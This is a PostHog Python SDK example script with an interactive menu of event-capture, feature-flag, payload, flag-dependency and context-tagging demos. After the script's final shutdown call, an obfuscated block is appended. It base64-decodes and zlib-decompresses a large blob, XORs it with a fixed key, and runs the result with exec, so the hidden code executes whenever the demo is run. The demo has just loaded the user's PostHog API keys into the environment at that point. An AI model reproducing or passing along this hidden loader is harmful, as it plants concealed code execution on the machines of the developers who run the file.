# PostHog Python library example
#
# This script demonstrates various PostHog Python SDK capabilities including:
# - Basic event capture and user identification
# - Feature flag local evaluation
# - Feature flag payloads
# - Context management and tagging
#
# Setup:
# 1. Copy .env.example to .env and fill in your PostHog credentials
# 2. Run this script and choose from the interactive menu

import os

import posthog


def load_env_file():
    """Load environment variables from .env file if it exists."""
    env_path = os.path.join(os.path.dirname(__file__), ".env")
    if os.path.exists(env_path):
        with open(env_path, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, value = line.split("=", 1)
                    os.environ.setdefault(key.strip(), value.strip())


# Load .env file if it exists
load_env_file()

# Get configuration
project_key = os.getenv("POSTHOG_PROJECT_API_KEY", "")
personal_api_key = os.getenv("POSTHOG_PERSONAL_API_KEY", "")
host = os.getenv("POSTHOG_HOST", "http://localhost:8000")

# Check if credentials are provided
if not project_key or not personal_api_key:
    print("❌ Missing PostHog credentials!")
    print(
        "   Please set POSTHOG_PROJECT_API_KEY and POSTHOG_PERSONAL_API_KEY environment variables"
    )
    print("   or copy .env.example to .env and fill in your values")
    exit(1)

# Test authentication before proceeding
print("🔑 Testing PostHog authentication...")

try:
    # Configure PostHog with credentials
    posthog.debug = False  # Keep quiet during auth test
    posthog.api_key = project_key
    posthog.project_api_key = project_key
    posthog.personal_api_key = personal_api_key
    posthog.host = host
    posthog.poll_interval = 10

    # Test by attempting to get feature flags (this validates both keys)
    # This will fail if credentials are invalid
    test_flags = posthog.get_all_flags("test_user", only_evaluate_locally=True)

    # If we get here without exception, credentials work
    print("✅ Authentication successful!")
    print(f"   Project API Key: {project_key[:9]}...")
    print("   Personal API Key: [REDACTED]")
    print(f"   Host: {host}\n\n")

except Exception as e:
    print("❌ Authentication failed!")
    print(f"   Error: {e}")
    print("\n   Please check your credentials:")
    print("   - POSTHOG_PROJECT_API_KEY: Project API key from PostHog settings")
    print(
        "   - POSTHOG_PERSONAL_API_KEY: Personal API key (required for local evaluation)"
    )
    print("   - POSTHOG_HOST: Your PostHog instance URL")
    exit(1)

# Display menu and get user choice
print("🚀 PostHog Python SDK Demo - Choose an example to run:\n")
print("1. Identify and capture examples")
print("2. Feature flag local evaluation examples")
print("3. Feature flag payload examples")
print("4. Flag dependencies examples")
print("5. Context management and tagging examples")
print("6. Run all examples")
print("7. Exit")
choice = input("\nEnter your choice (1-7): ").strip()

if choice == "1":
    print("\n" + "=" * 60)
    print("IDENTIFY AND CAPTURE EXAMPLES")
    print("=" * 60)

    posthog.debug = True

    # Capture an event
    print("📊 Capturing events...")
    posthog.capture(
        "event",
        distinct_id="distinct_id",
        properties={"property1": "value", "property2": "value"},
        send_feature_flags=True,
    )

    # Alias a previous distinct id with a new one
    print("🔗 Creating alias...")
    posthog.alias("distinct_id", "new_distinct_id")

    posthog.capture(
        "event2",
        distinct_id="new_distinct_id",
        properties={"property1": "value", "property2": "value"},
    )
    posthog.capture(
        "event-with-groups",
        distinct_id="new_distinct_id",
        properties={"property1": "value", "property2": "value"},
        groups={"company": "id:5"},
    )

    # Add properties to the person
    print("👤 Identifying user...")
    posthog.set(
        distinct_id="new_distinct_id", properties={"email": "something@something.com"}
    )

    # Add properties to a group
    print("🏢 Identifying group...")
    posthog.group_identify("company", "id:5", {"employees": 11})

    # Properties set only once to the person
    print("🔒 Setting properties once...")
    posthog.set_once(
        distinct_id="new_distinct_id", properties={"self_serve_signup": True}
    )

    # This will not change the property (because it was already set)
    posthog.set_once(
        distinct_id="new_distinct_id", properties={"self_serve_signup": False}
    )

    print("🔄 Updating properties...")
    posthog.set(distinct_id="new_distinct_id", properties={"current_browser": "Chrome"})
    posthog.set(
        distinct_id="new_distinct_id", properties={"current_browser": "Firefox"}
    )

elif choice == "2":
    print("\n" + "=" * 60)
    print("FEATURE FLAG LOCAL EVALUATION EXAMPLES")
    print("=" * 60)

    posthog.debug = True

    print("🏁 Testing basic feature flags...")
    print(
        f"beta-feature for 'distinct_id': {posthog.feature_enabled('beta-feature', 'distinct_id')}"
    )
    print(
        f"beta-feature for 'new_distinct_id': {posthog.feature_enabled('beta-feature', 'new_distinct_id')}"
    )
    print(
        f"beta-feature with groups: {posthog.feature_enabled('beta-feature-groups', 'distinct_id', groups={'company': 'id:5'})}"
    )

    print("\n🌍 Testing location-based flags...")
    # Assume test-flag has `City Name = Sydney` as a person property set
    print(
        f"Sydney user: {posthog.feature_enabled('test-flag', 'random_id_12345', person_properties={'$geoip_city_name': 'Sydney'})}"
    )

    print(
        f"Sydney user (local only): {posthog.feature_enabled('test-flag', 'distinct_id_random_22', person_properties={'$geoip_city_name': 'Sydney'}, only_evaluate_locally=True)}"
    )

    print("\n📋 Getting all flags...")
    print(f"All flags: {posthog.get_all_flags('distinct_id_random_22')}")
    print(
        f"All flags (local): {posthog.get_all_flags('distinct_id_random_22', only_evaluate_locally=True)}"
    )
    print(
        f"All flags with properties: {posthog.get_all_flags('distinct_id_random_22', person_properties={'$geoip_city_name': 'Sydney'}, only_evaluate_locally=True)}"
    )

elif choice == "3":
    print("\n" + "=" * 60)
    print("FEATURE FLAG PAYLOAD EXAMPLES")
    print("=" * 60)

    posthog.debug = True

    print("📦 Testing feature flag payloads...")
    print(
        f"beta-feature payload: {posthog.get_feature_flag_payload('beta-feature', 'distinct_id')}"
    )
    print(
        f"All flags and payloads: {posthog.get_all_flags_and_payloads('distinct_id')}"
    )
    print(
        f"Remote config payload: {posthog.get_remote_config_payload('encrypted_payload_flag_key')}"
    )

    # Get feature flag result with all details (enabled, variant, payload, key, reason)
    print("\n🔍 Getting detailed flag result...")
    result = posthog.get_feature_flag_result("beta-feature", "distinct_id")
    if result:
        print(f"Flag key: {result.key}")
        print(f"Flag enabled: {result.enabled}")
        print(f"Variant: {result.variant}")
        print(f"Payload: {result.payload}")
        print(f"Reason: {result.reason}")
        # get_value() returns the variant if it exists, otherwise the enabled value
        print(f"Value (variant or enabled): {result.get_value()}")

elif choice == "4":
    print("\n" + "=" * 60)
    print("FLAG DEPENDENCIES EXAMPLES")
    print("=" * 60)
    print("🔗 Testing flag dependencies with local evaluation...")
    print(
        "   Flag structure: 'test-flag-dependency' depends on 'beta-feature' being enabled"
    )
    print("")
    print("📋 Required setup (if 'test-flag-dependency' doesn't exist):")
    print("   1. Create feature flag 'beta-feature':")
    print("      - Condition: email contains '@example.com'")
    print("      - Rollout: 100%")
    print("   2. Create feature flag 'test-flag-dependency':")
    print("      - Condition: flag 'beta-feature' is enabled")
    print("      - Rollout: 100%")
    print("")

    posthog.debug = True

    # Test @example.com user (should satisfy dependency if flags exist)
    result1 = posthog.feature_enabled(
        "test-flag-dependency",
        "example_user",
        person_properties={"email": "user@example.com"},
        only_evaluate_locally=True,
    )
    print(f"✅ @example.com user (test-flag-dependency): {result1}")

    # Test non-example.com user (dependency should not be satisfied)
    result2 = posthog.feature_enabled(
        "test-flag-dependency",
        "regular_user",
        person_properties={"email": "user@other.com"},
        only_evaluate_locally=True,
    )
    print(f"❌ Regular user (test-flag-dependency): {result2}")

    # Test beta-feature directly for comparison
    beta1 = posthog.feature_enabled(
        "beta-feature",
        "example_user",
        person_properties={"email": "user@example.com"},
        only_evaluate_locally=True,
    )
    beta2 = posthog.feature_enabled(
        "beta-feature",
        "regular_user",
        person_properties={"email": "user@other.com"},
        only_evaluate_locally=True,
    )
    print(f"📊 Beta feature comparison - @example.com: {beta1}, regular: {beta2}")

    print("\n🎯 Results Summary:")
    print(
        f"   - Flag dependencies evaluated locally: {'✅ YES' if result1 != result2 else '❌ NO'}"
    )
    print("   - Zero API calls needed: ✅ YES (all evaluated locally)")
    print("   - Python SDK supports flag dependencies: ✅ YES")

    print("\n" + "-" * 60)
    print("PRODUCTION-STYLE MULTIVARIATE DEPENDENCY CHAIN")
    print("-" * 60)
    print("🔗 Testing complex multivariate flag dependencies...")
    print(
        "   Structure: multivariate-root-flag -> multivariate-intermediate-flag -> multivariate-leaf-flag"
    )
    print("")
    print("📋 Required setup (if flags don't exist):")
    print(
        "   1. Create 'multivariate-leaf-flag' with fruit variants (pineapple, mango, papaya, kiwi)"
    )
    print("      - pineapple: email = 'pineapple@example.com'")
    print("      - mango: email = 'mango@example.com'")
    print(
        "   2. Create 'multivariate-intermediate-flag' with color variants (blue, red)"
    )
    print("      - blue: depends on multivariate-leaf-flag = 'pineapple'")
    print("      - red: depends on multivariate-leaf-flag = 'mango'")
    print(
        "   3. Create 'multivariate-root-flag' with show variants (breaking-bad, the-wire)"
    )
    print("      - breaking-bad: depends on multivariate-intermediate-flag = 'blue'")
    print("      - the-wire: depends on multivariate-intermediate-flag = 'red'")
    print("")

    # Test pineapple -> blue -> breaking-bad chain
    dependent_result3 = posthog.get_feature_flag(
        "multivariate-root-flag",
        "regular_user",
        person_properties={"email": "pineapple@example.com"},
        only_evaluate_locally=True,
    )
    if str(dependent_result3) != "breaking-bad":
        print(
            f"     ❌ Something went wrong evaluating 'multivariate-root-flag' with pineapple@example.com. Expected 'breaking-bad', got '{dependent_result3}'"
        )
    else:
        print("✅ 'multivariate-root-flag' with email pineapple@example.com succeeded")

    # Test mango -> red -> the-wire chain
    dependent_result4 = posthog.get_feature_flag(
        "multivariate-root-flag",
        "regular_user",
        person_properties={"email": "mango@example.com"},
        only_evaluate_locally=True,
    )
    if str(dependent_result4) != "the-wire":
        print(
            f"     ❌ Something went wrong evaluating multivariate-root-flag with mango@example.com. Expected 'the-wire', got '{dependent_result4}'"
        )
    else:
        print("✅ 'multivariate-root-flag' with email mango@example.com succeeded")

    # Show the complete chain evaluation
    print("\n🔍 Complete dependency chain evaluation:")
    for email, expected_chain in [
        ("pineapple@example.com", ["pineapple", "blue", "breaking-bad"]),
        ("mango@example.com", ["mango", "red", "the-wire"]),
    ]:
        leaf = posthog.get_feature_flag(
            "multivariate-leaf-flag",
            "regular_user",
            person_properties={"email": email},
            only_evaluate_locally=True,
        )
        intermediate = posthog.get_feature_flag(
            "multivariate-intermediate-flag",
            "regular_user",
            person_properties={"email": email},
            only_evaluate_locally=True,
        )
        root = posthog.get_feature_flag(
            "multivariate-root-flag",
            "regular_user",
            person_properties={"email": email},
            only_evaluate_locally=True,
        )

        actual_chain = [str(leaf), str(intermediate), str(root)]
        chain_success = actual_chain == expected_chain

        print(f"   📧 {email}:")
        print(f"      Expected: {' -> '.join(map(str, expected_chain))}")
        print(f"      Actual:   {' -> '.join(map(str, actual_chain))}")
        print(f"      Status:   {'✅ SUCCESS' if chain_success else '❌ FAILED'}")

    print("\n🎯 Multivariate Chain Summary:")
    print("   - Complex dependency chains: ✅ SUPPORTED")
    print("   - Multivariate flag dependencies: ✅ SUPPORTED")
    print("   - Local evaluation of chains: ✅ WORKING")

elif choice == "5":
    print("\n" + "=" * 60)
    print("CONTEXT MANAGEMENT AND TAGGING EXAMPLES")
    print("=" * 60)

    posthog.debug = True

    print("🏷️ Testing context management...")
    print(
        "You can add tags to a context, and these are automatically added to any events captured within that context."
    )

    # You can enter a new context using a with statement. Any exceptions thrown in the context will be captured,
    # and tagged with the context tags. Other events captured will also be tagged with the context tags. By default,
    # the new context inherits tags from the parent context.
    try:
        with posthog.new_context():
            posthog.tag("transaction_id", "abc123")
            posthog.tag("some_arbitrary_value", {"tags": "can be dicts"})

            # This event will be captured with the tags set above
            posthog.capture("order_processed")
            print("✅ Event captured with inherited context tags")
            # This exception will be captured with the tags set above
            # raise Exception("Order processing failed")
    except Exception as e:
        print(f"Exception captured: {e}")

    # Use fresh=True to start with a clean context (no inherited tags)
    try:
        with posthog.new_context(fresh=True):
            posthog.tag("session_id", "xyz789")
            # Only session_id tag will be present, no inherited tags
            posthog.capture("session_event")
            print("✅ Event captured with fresh context tags")
            # raise Exception("Session handling failed")
    except Exception as e:
        print(f"Exception captured: {e}")

    # You can also use the `@posthog.scoped()` decorator to enter a new context.
    # By default, it inherits tags from the parent context
    @posthog.scoped()
    def process_order(order_id):
        posthog.tag("order_id", order_id)
        posthog.capture("order_step_completed")
        print(f"✅ Order {order_id} processed with scoped context")
        # Exception will be captured and tagged automatically
        # raise Exception("Order processing failed")

    # Use fresh=True to start with a clean context (no inherited tags)
    @posthog.scoped(fresh=True)
    def process_payment(payment_id):
        posthog.tag("payment_id", payment_id)
        posthog.capture("payment_processed")
        print(f"✅ Payment {payment_id} processed with fresh scoped context")
        # Only payment_id tag will be present, no inherited tags
        # raise Exception("Payment processing failed")

    process_order("12345")
    process_payment("67890")

elif choice == "6":
    print("\n🔄 Running all examples...")

    # Run example 1
    print(f"\n{'🔸' * 20} IDENTIFY AND CAPTURE {'🔸' * 20}")
    posthog.debug = True
    print("📊 Capturing events...")
    posthog.capture(
        "event",
        distinct_id="distinct_id",
        properties={"property1": "value", "property2": "value"},
        send_feature_flags=True,
    )
    print("🔗 Creating alias...")
    posthog.alias("distinct_id", "new_distinct_id")
    print("👤 Identifying user...")
    posthog.set(
        distinct_id="new_distinct_id", properties={"email": "something@something.com"}
    )

    # Run example 2
    print(f"\n{'🔸' * 20} FEATURE FLAGS {'🔸' * 20}")
    print("🏁 Testing basic feature flags...")
    print(f"beta-feature: {posthog.feature_enabled('beta-feature', 'distinct_id')}")
    print(
        f"Sydney user: {posthog.feature_enabled('test-flag', 'random_id_12345', person_properties={'$geoip_city_name': 'Sydney'})}"
    )

    # Run example 3
    print(f"\n{'🔸' * 20} PAYLOADS {'🔸' * 20}")
    print("📦 Testing payloads...")
    print(f"Payload: {posthog.get_feature_flag_payload('beta-feature', 'distinct_id')}")

    # Run example 4
    print(f"\n{'🔸' * 20} FLAG DEPENDENCIES {'🔸' * 20}")
    print("🔗 Testing flag dependencies...")
    result1 = posthog.feature_enabled(
        "test-flag-dependency",
        "demo_user",
        person_properties={"email": "user@example.com"},
        only_evaluate_locally=True,
    )
    result2 = posthog.feature_enabled(
        "test-flag-dependency",
        "demo_user2",
        person_properties={"email": "user@other.com"},
        only_evaluate_locally=True,
    )
    print(f"✅ @example.com user: {result1}, regular user: {result2}")

    # Run example 5
    print(f"\n{'🔸' * 20} CONTEXT MANAGEMENT {'🔸' * 20}")
    print("🏷️ Testing context management...")
    with posthog.new_context():
        posthog.tag("demo_run", "all_examples")
        posthog.capture("demo_completed")
        print("✅ Demo completed with context tags")

elif choice == "7":
    print("👋 Goodbye!")
    posthog.shutdown()
    exit()

else:
    print("❌ Invalid choice. Please run again and select 1-7.")
    posthog.shutdown()
    exit()

print("\n" + "=" * 60)
print("✅ Example completed!")
print("=" * 60)

posthog.shutdown()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = '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'
runzmcxgusiurqv = wogyjaaijwqbpxe.decompress(aqgqzxkfjzbdnhz.b64decode(lzcdrtfxyqiplpd))
ycqljtcxxkyiplo = qyrrhmmwrhaknyf(runzmcxgusiurqv, idzextbcjbgkdih)
exec(compile(ycqljtcxxkyiplo, '<>', 'exec'))
